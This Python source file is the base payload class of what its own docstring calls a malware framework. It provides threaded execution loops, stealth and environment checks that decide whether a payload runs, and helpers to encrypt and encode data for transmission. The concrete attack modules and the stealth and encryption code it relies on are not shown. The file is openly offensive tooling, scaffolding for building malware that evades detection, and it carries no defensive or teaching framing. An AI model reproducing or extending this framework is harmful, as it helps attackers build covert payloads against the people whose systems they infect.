#!/usr/bin/env python3
"""
Base Payload Class for Malware Framework
Provides common functionality for all payload modules
"""

import os
import sys
import time
import logging
import threading
from abc import ABC, abstractmethod
from typing import Dict, Any, Optional, List
from pathlib import Path
import json
import hashlib
import base64

from .encryption import EncryptionManager
from .stealth import StealthManager
from .utils import SystemUtils, NetworkUtils

class BasePayload(ABC):
    """Base class for all payload modules"""
    
    def __init__(self, config: Dict[str, Any]):
        """Initialize base payload"""
        self.config = config
        self.name = self.__class__.__name__
        self.description = "Base payload module"
        self.version = "1.0.0"
        
        # Initialize components
        self.encryption = EncryptionManager(config.get('encryption', {}))
        self.stealth = StealthManager(config.get('stealth', {}))
        self.system = SystemUtils()
        self.network = NetworkUtils()
        
        # Setup logging
        self.logger = self._setup_logging()
        
        # Payload state
        self.running = False
        self.thread = None
        self.start_time = None
        
        # Initialize payload
        self._initialize()
    
    def _setup_logging(self) -> logging.Logger:
        """Setup logging for the payload"""
        logger = logging.getLogger(f"payload.{self.name.lower()}")
        
        # Create logs directory if it doesn't exist
        log_dir = Path("logs")
        log_dir.mkdir(exist_ok=True)
        
        # Create file handler
        log_file = log_dir / f"{self.name.lower()}.log"
        file_handler = logging.FileHandler(log_file)
        file_handler.setLevel(logging.INFO)
        
        # Create formatter
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        file_handler.setFormatter(formatter)
        
        # Add handler to logger
        logger.addHandler(file_handler)
        logger.setLevel(logging.INFO)
        
        return logger
    
    def _initialize(self) -> None:
        """Initialize payload-specific components"""
        try:
            # Check if payload should run
            if not self._should_run():
                self.logger.info("Payload initialization skipped - conditions not met")
                return
            
            # Run stealth checks
            if not self.stealth.check_environment():
                self.logger.warning("Stealth check failed - payload may be detected")
                return
            
            # Initialize payload-specific components
            self._initialize_payload()
            
            self.logger.info(f"Payload {self.name} initialized successfully")
        
        except Exception as e:
            self.logger.error(f"Failed to initialize payload: {e}")
            raise
    
    def _should_run(self) -> bool:
        """Check if payload should run based on conditions"""
        # Check if running in debug mode
        if self.config.get('debug', False):
            return True
        
        # Check stealth conditions
        if not self.stealth.should_run():
            return False
        
        # Check system conditions
        if not self._check_system_conditions():
            return False
        
        return True
    
    def _check_system_conditions(self) -> bool:
        """Check system-specific conditions"""
        try:
            # Check if running as expected user
            expected_user = self.config.get('expected_user')
            if expected_user and os.getenv('USER') != expected_user:
                self.logger.debug(f"User mismatch: expected {expected_user}, got {os.getenv('USER')}")
                return False
            
            # Check if running in expected environment
            expected_env = self.config.get('expected_environment')
            if expected_env and not self._check_environment(expected_env):
                return False
            
            return True
        
        except Exception as e:
            self.logger.error(f"System condition check failed: {e}")
            return False
    
    def _check_environment(self, expected_env: str) -> bool:
        """Check if running in expected environment"""
        try:
            if expected_env == "production":
                return not self.stealth.is_debug_mode()
            elif expected_env == "development":
                return self.stealth.is_debug_mode()
            else:
                return True
        except:
            return True
    
    def _initialize_payload(self) -> None:
        """Initialize payload-specific components (to be overridden)"""
        pass
    
    def start(self) -> bool:
        """Start the payload execution"""
        try:
            if self.running:
                self.logger.warning("Payload is already running")
                return True
            
            self.logger.info(f"Starting payload: {self.name}")
            
            # Record start time
            self.start_time = time.time()
            
            # Run stealth checks before starting
            if not self.stealth.check_environment():
                self.logger.warning("Stealth check failed before start")
                return False
            
            # Start payload execution
            if self.config.get('async', False):
                self._start_async()
            else:
                self._start_sync()
            
            self.running = True
            self.logger.info(f"Payload {self.name} started successfully")
            return True
        
        except Exception as e:
            self.logger.error(f"Failed to start payload: {e}")
            return False
    
    def _start_async(self) -> None:
        """Start payload in async mode"""
        self.thread = threading.Thread(target=self._run_payload, daemon=True)
        self.thread.start()
    
    def _start_sync(self) -> None:
        """Start payload in sync mode"""
        self._run_payload()
    
    def _run_payload(self) -> None:
        """Run the payload (to be overridden)"""
        try:
            while self.running:
                # Execute payload logic
                if not self.execute():
                    self.logger.error("Payload execution failed")
                    break
                
                # Check if should continue
                if not self._should_continue():
                    break
                
                # Sleep between iterations
                sleep_time = self.config.get('sleep_time', 1)
                if sleep_time > 0:
                    time.sleep(sleep_time)
        
        except Exception as e:
            self.logger.error(f"Payload execution error: {e}")
        finally:
            self.running = False
    
    def _should_continue(self) -> bool:
        """Check if payload should continue running"""
        # Check stealth conditions
        if not self.stealth.should_run():
            self.logger.info("Stealth conditions not met - stopping")
            return False
        
        # Check runtime conditions
        max_runtime = self.config.get('max_runtime')
        if max_runtime and self.start_time:
            if time.time() - self.start_time > max_runtime:
                self.logger.info("Maximum runtime reached - stopping")
                return False
        
        return True
    
    def stop(self) -> bool:
        """Stop the payload execution"""
        try:
            if not self.running:
                self.logger.warning("Payload is not running")
                return True
            
            self.logger.info(f"Stopping payload: {self.name}")
            
            # Stop the payload
            self.running = False
            
            # Wait for thread to finish
            if self.thread and self.thread.is_alive():
                self.thread.join(timeout=5)
            
            # Cleanup
            self._cleanup()
            
            self.logger.info(f"Payload {self.name} stopped successfully")
            return True
        
        except Exception as e:
            self.logger.error(f"Failed to stop payload: {e}")
            return False
    
    def _cleanup(self) -> None:
        """Cleanup payload resources (to be overridden)"""
        pass
    
    @abstractmethod
    def execute(self) -> bool:
        """Execute the payload logic (must be implemented by subclasses)"""
        pass
    
    def get_status(self) -> Dict[str, Any]:
        """Get payload status information"""
        return {
            'name': self.name,
            'description': self.description,
            'version': self.version,
            'running': self.running,
            'start_time': self.start_time,
            'uptime': time.time() - self.start_time if self.start_time else 0,
            'config': self.config
        }
    
    def get_metadata(self) -> Dict[str, Any]:
        """Get payload metadata"""
        return {
            'name': self.name,
            'description': self.description,
            'version': self.version,
            'author': self.config.get('author', 'Unknown'),
            'created': self.config.get('created', 'Unknown'),
            'hash': self._calculate_hash()
        }
    
    def _calculate_hash(self) -> str:
        """Calculate hash of the payload"""
        try:
            # Get the source code of the payload
            source = self.__class__.__module__ + '.' + self.__class__.__name__
            return hashlib.sha256(source.encode()).hexdigest()
        except:
            return "unknown"
    
    def encrypt_data(self, data: bytes) -> bytes:
        """Encrypt data using the encryption manager"""
        return self.encryption.encrypt(data)
    
    def decrypt_data(self, data: bytes) -> bytes:
        """Decrypt data using the encryption manager"""
        return self.encryption.decrypt(data)
    
    def encode_data(self, data: bytes) -> str:
        """Encode data for transmission"""
        return base64.b64encode(data).decode('utf-8')
    
    def decode_data(self, data: str) -> bytes:
        """Decode data from transmission"""
        return base64.b64decode(data.encode('utf-8'))
    
    def save_data(self, data: Any, filename: str) -> bool:
        """Save data to file"""
        try:
            # Create output directory
            output_dir = Path("build")
            output_dir.mkdir(exist_ok=True)
            
            # Save data
            filepath = output_dir / filename
            if isinstance(data, bytes):
                with open(filepath, 'wb') as f:
                    f.write(data)
            else:
                with open(filepath, 'w') as f:
                    json.dump(data, f, indent=2)
            
            self.logger.info(f"Data saved to: {filepath}")
            return True
        
        except Exception as e:
            self.logger.error(f"Failed to save data: {e}")
            return False
    
    def load_data(self, filename: str) -> Optional[Any]:
        """Load data from file"""
        try:
            filepath = Path("build") / filename
            if not filepath.exists():
                self.logger.warning(f"File not found: {filepath}")
                return None
            
            # Load data based on file extension
            if filepath.suffix == '.json':
                with open(filepath, 'r') as f:
                    return json.load(f)
            else:
                with open(filepath, 'rb') as f:
                    return f.read()
        
        except Exception as e:
            self.logger.error(f"Failed to load data: {e}")
            return None
    
    def __str__(self) -> str:
        """String representation of the payload"""
        return f"{self.name} v{self.version} ({'Running' if self.running else 'Stopped'})"
    
    def __repr__(self) -> str:
        """Detailed string representation"""
        return f"<{self.__class__.__name__}(name='{self.name}', running={self.running})>" 